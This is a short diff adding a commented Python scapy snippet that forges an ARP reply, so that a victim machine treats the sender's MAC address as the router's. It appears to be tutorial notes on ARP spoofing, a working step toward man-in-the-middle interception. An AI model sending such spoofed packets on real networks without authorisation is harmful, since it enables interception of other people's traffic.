@@ -1,0 +1,11 @@
+target_ip --> ip of the machine we want to think we're router, spoof_ip --> router's ip address.
+We sent an answer to victim machine with our MAC address and routers's IP, so we make it think that we are router.
+
+packet = scapy.ARP(op=2, pdst=target_ip, hwdst=str(get_mac_by_ip(target_ip)), psrc=spoof_ip) # make an ARP answer
+
+# op <==> 1 - request, 2 - answer
+# pdst <==> ip of target machine
+# hwdst <==> MAC address of target machine
+# psrc <==> ip of router
+
+scapy.send(packet, verbose=False) # send package, verbose=True <==> show message "Sent 1 package"
